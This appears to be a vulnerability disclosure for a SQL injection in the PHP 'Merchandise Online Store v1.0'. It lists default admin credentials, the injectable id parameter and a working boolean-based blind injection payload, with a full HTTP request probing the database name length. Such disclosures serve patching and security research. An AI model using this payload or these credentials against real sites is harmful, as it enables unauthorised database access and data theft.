# Merchandise Online Store v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability File: /vloggers_merch/admin/?page=maintenance/manage_category&id=

Vulnerability location: /vloggers_merch/admin/?page=maintenance/manage_category&id=,id

[+] Payload: /vloggers_merch/admin/?page=maintenance/manage_category&id=2%27%20and%20length(database())%20=17--+ // Leak place ---> id

Current database name: vloggers_merch_db,length is 17

```sql
GET /vloggers_merch/admin/?page=maintenance/manage_category&id=2%27%20and%20length(database())%20=17--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close
```

When length (database ()) = 16, Content-Length: 26268
![image](https://user-images.githubusercontent.com/54017627/166899404-3ed22cce-2b07-46ae-a222-c67b6b0a5da0.png)

![image](https://user-images.githubusercontent.com/54017627/166899288-79e798fe-7d8b-44f2-9c9d-1d63c7732656.png)

When length (database ()) = 17, Content-Length: 26317
![image](https://user-images.githubusercontent.com/54017627/166899339-896671f4-980a-44df-a51a-100d9db193e2.png)

![image](https://user-images.githubusercontent.com/54017627/166899240-792842fb-888b-4296-8136-00d5dcd1064f.png)
